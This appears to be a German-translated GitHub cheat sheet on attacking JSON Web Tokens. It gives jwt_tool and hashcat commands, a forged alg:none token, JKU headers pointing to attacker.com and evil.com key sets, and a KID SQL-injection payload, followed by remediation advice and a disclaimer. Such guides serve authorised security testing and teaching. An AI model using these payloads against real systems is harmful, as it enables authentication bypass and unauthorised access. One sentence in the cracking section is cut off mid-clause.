<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎟️ JWT-Angriffe – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<p align="center">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Key Attacks">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API-Tests">
</p>

<p align="center">
  <b>🛡️ Umfassende Methodik und praktische Befehle zum Ausnutzen von JSON Web Token (JWT)-Schwachstellen</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung und Anatomie eines JWT](#-introduction--anatomy-of-a-jwt)
- [Wesentliche Testtools](#-essential-testing-tools)
- [Schwachstellenmatrix und Angriffsvektoren](#-vulnerability-matrix--attack-vectors)
  - [1. Keiner Algorithmusfehler (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
  - [2. Schwaches HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
  - [3. Algorithmusverwirrung/Schlüsselverwirrung (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
  - [4. JWK (JSON Web Key) Header-Injection](#4-jwk-json-web-key-header-injection)
  - [5. JKU (JWK Set URL) Fehlkonfiguration und SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. KID (Key ID) Header-Manipulation und Injektionen](#6-kid-key-id-header-manipulation--injections)
  - [7. Cross-Service-Relaying und Leckage sensibler Daten](#7-Cross-Service-Relaying--sensitive-Data-Leakage)
- [Automatisieren von Tests mit `jwt_tool`](#-automating-tests-with-jwt_tool)
- [JWT-Geheimnisse mit Hashcat knacken](#-cracking-jwt-secrets-with-hashcat)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Remediation & sichere Implementierung](#-remediation--secure-implementation)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
- [Ressourcen](#-Ressourcen)

---

## 🎯 Einführung und Anatomie eines JWT

Ein **JSON Web Token (JWT)** ist ein kompaktes, URL-sicheres Mittel zur Darstellung von Ansprüchen zwischen zwei Parteien. Wird häufig für die Sitzungsauthentifizierung in modernen REST-APIs, Single Page Applications (SPAs) und Microservices verwendet.

Ein Standard-JWT besteht aus drei Base64URL-codierten Teilen, die durch Punkte (`.`) getrennt sind:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **Header:** Identifiziert den Token-Typ und den verwendeten kryptografischen Algorithmus (z. B. `HS256`, `RS256`, `none`).
2. **Payload:** Enthält die Ansprüche (z. B. `user_id`, `role`, Ablauf `exp`). *Hinweis: Payloads sind codiert, NICHT verschlüsselt!*
3. **Signatur:** Erstellt durch Hashing des codierten Headers und der Nutzlast mithilfe eines geheimen oder privaten Schlüssels.

---

## 🛠️ Grundlegende Testtools

1. **jwt_tool:** Befehlszeilen-Toolkit zum Analysieren, Testen und Knacken von JWTs.
2. **Hashcat:** Schnelles GPU-basiertes HMAC-Geheimnisknacken (Modus `16500`).
3. **Burp Suite-Erweiterung:** „JWT Editor“ von Fraser Winterborn (im PortSwigger BApp Store).

### `jwt_tool` installieren
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 Schwachstellenmatrix und Angriffsvektoren

### 1. Keiner Algorithmusfehler (`alg: "none"`)

**Mechanismus:**
Einige JWT-Verifizierungsbibliotheken betrachten Token als gültig, wenn der `alg`-Header auf `none` gesetzt ist, wodurch die Signaturüberprüfung vollständig umgangen wird.

**Ausbeutung:**
1. Dekodieren Sie den Header und ändern Sie `"alg": "HS256"` in `"alg": "none"`.
2. Nutzlastansprüche ändern (z. B. `"role": "admin"`).
3. Entfernen Sie den Signaturteil (behalten Sie den abschließenden Punkt bei!).
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*Manuelle Token-Struktur:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2. Schwaches HMAC Secret Cracking (HS256)

**Mechanismus:**
Wenn der Server Token mithilfe symmetrischer Algorithmen (`HS256`, `HS384`, `HS512`) mit einem erratenen oder schwachen geheimen Schlüssel (z. B. `secret`,

**Knacken mit Hashcat:**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
**Token nach dem Knacken fälschen:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3. Algorithmusverwirrung/Schlüsselverwirrung (RS256 -> HS256)

**Mechanismus:**
- **RS256 (asymmetrisch):** Signiert mit dem privaten Schlüssel des Servers; mit dem **öffentlichen Schlüssel** des Servers verifiziert.
- **HS256 (Symmetrisch):** Signiert und verifiziert mit dem **gleichen gemeinsamen Geheimnis**.

Wenn die Backend-Bibliothek die Algorithmustypen nicht strikt erzwingt, kann ein Angreifer Folgendes tun:
1. Besorgen Sie sich den öffentlichen Schlüssel des Servers (häufig öffentlich zugänglich unter `/.well-known/jwks.json` oder in Zertifikaten).
2. Ändern Sie den Algorithmus-Header des Tokens von `RS256` in `HS256`.
3. Signieren Sie das geänderte Token mit dem **öffentlichen Schlüssel** des Servers als HMAC-Geheimnis!
4. Der Server empfängt das Token, sieht `HS256` und überprüft die Signatur mithilfe seines konfigurierten Überprüfungsschlüssels (der sein öffentlicher Schlüssel ist), was zu einer gültigen Signatur führt!

**Ausbeutung über `jwt_tool`:**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. JWK (JSON Web Key) Header-Injection

**Mechanismus:**
Die JWT-Spezifikation erlaubt einen eingebetteten öffentlichen Schlüssel im `jwk`-Header-Parameter. Anfällige Server vertrauen diesem Header-Schlüssel, um die Signatur zu überprüfen, ohne zu prüfen, ob der Schlüssel zu einer vertrauenswürdigen Zertifizierungsstelle oder einer vorab freigegebenen Whitelist gehört.

**Ausbeutung:**
1. Generieren Sie ein RSA-Schlüsselpaar für den Angreifer.
2. Betten Sie den öffentlichen Schlüssel in den `jwk`-Header ein.
3. Signieren Sie den Token mit Ihrem passenden privaten Schlüssel.
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. JKU (JWK Set URL) Fehlkonfiguration und SSRF

**Mechanismus:**
Der `jku`-Header (JWK Set URL) gibt eine Remote-URL an, von der der Server den öffentlichen Schlüsselsatz zur Überprüfung des Tokens abrufen soll.

**Ausbeutung:**
1. Hosten Sie Ihr eigenes `jwks.json` auf einem Angreifer-Webserver:
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2. Ändern Sie den Token-Header:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. Signieren Sie den Token mit Ihrem privaten Schlüssel.

> **URL-Whitelists umgehen:**
> Wenn die Anwendung Domain-Endungen validiert, testen Sie offene Weiterleitungen oder URL-Parsing-Macken:
> - `https://trusted.com@attacker.com/jwks.json`
> - `https://trusted.com.attacker.com/jwks.json`
> - Weiterleitung öffnen: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. KID-Header-Manipulation (Schlüssel-ID) und Injektionen

Der `kid`-Header ist eine Zeichenfolge, die verwendet wird, um zu identifizieren, welcher Schlüssel aus einer Datenbank oder einem Dateisystem geladen werden soll.

#### A. Verzeichnisdurchlauf zur leeren Datei (`/dev/null`)
Wenn der Server die Schlüsseldatei mit `kid` von der Festplatte liest:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
Signieren Sie den Token mit einem leeren Geheimnis (`""` / 0 Bytes)!

#### B. SQL-Injection über KID
Wenn der Server das Geheimnis aus einer Datenbank abruft:
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
Fügen Sie eine bekannte statische Zeichenfolge ein:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
Signieren Sie den Token mit dem Geheimnis `'my_known_secret'`.

---

### 7. Dienstübergreifende Weiterleitung und Verlust sensibler Daten

- **Unverschlüsselte PII:** Entwickler speichern häufig Passwörter, SSNs oder vertrauliche Benutzermetadaten in der Nutzlast und vergessen dabei, dass diese nur Base64URL-codiert und nicht verschlüsselt sind.
- **Dienstverwirrung:** Verwendung eines Tokens, der für einen Dienst mit geringen Berechtigungen (z. B. Analyse-API) gedacht ist, gegen eine interne Verwaltungs-API.

---

## ⚡ Automatisieren von Tests mit `jwt_tool`

### Führen Sie alle integrierten Playbook-Angriffe aus
Der einfachste Weg, automatisch nach allen bekannten Schwachstellen zu suchen:
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### Interaktiver Manipulationsmodus
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 JWT-Geheimnisse mit Hashcat knacken
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 Kurzreferenztabelle

| Sicherheitslücke | Angriffstechnik | Schlüsselnutzlast/Flagge |
|--------------|------------------|--------------------|
| **Kein Algorithmus** | Setze `alg: "none"`, Streifensignatur | `jwt_tool <TOKEN> -X a` |
| **Schwaches Geheimnis** | GPU-Wörterbuch Brute-Force | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **Algorithmus-Verwirrung**| RS256 auf HS256 ändern, mit öffentlichem Schlüssel signieren | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **JWK-Injektion** | Öffentlichen Schlüssel des Angreifers in Header einbetten | `jwt_tool <TOKEN> -X i` |
| **JKU-Injektion** | Zeigen Sie `jku` auf einen externen Server | `"jku": "http://evil.com/jwks.json"` |
| **KID-Pfaddurchquerung**| Zeigen Sie `kid` auf `/dev/null` oder eine bekannte Datei | `"kid": "/dev/null"` (Signieren mit `""`) |
| **KID SQLi** | Statisches Geheimnis in SQL-Abfrage einfügen | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ Sanierung und sichere Implementierung

1. **Ausdrückliche Whitelist-Algorithmen:**
   Erlauben Sie niemals eine vom Client gesteuerte `alg`-Auswahl. Hardcode erlaubt Algorithmen auf dem Server (z. B. ausschließlich `RS256` zulassen).
2. **`alg: none`-Tokens ablehnen:**
   Stellen Sie sicher, dass die Bibliothek nicht verifizierte oder nicht signierte Token strikt ablehnt.
3. **Verwenden Sie lange, kryptografisch sichere Geheimnisse:**
   HMAC-Geheimnisse müssen mindestens 256 Bit (32+ zufällige Zeichen) umfassen und von einem sicheren CSPRNG generiert werden.
4. **`jku`- und `jwk`-Header validieren:**
   Rufen Sie JWK-Sets nur aus einer strengen Whitelist interner vertrauenswürdiger URLs ab. Vom Benutzer bereitgestellte externe Domänen ablehnen.
5. **`kid`-Werte bereinigen:**
   Behandeln Sie `kid` als nicht vertrauenswürdige Benutzereingabe. Desinfizieren gegen Verzeichnisdurchquerung (`../`) und SQL-Injection.

---

## ⚠️ Rechtlicher Haftungsausschluss

> **WICHTIG:** JWT-Angriffe können zur vollständigen Umgehung der Authentifizierung und zum unbefugten Zugriff auf Anwendungsdatenbanken führen. Dieser Leitfaden ist ausschließlich für Bildungszwecke und autorisierte Penetrationstests gedacht.

---

## 📚 Ressourcen

- [jwt_tool GitHub Repository](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web Security Academy: JWT-Angriffe](https://portswigger.net/web-security/jwt)
- [RFC 7519 – JSON Web Token (JWT) Standard](https://datatracker.ietf.org/doc/html/rfc7519)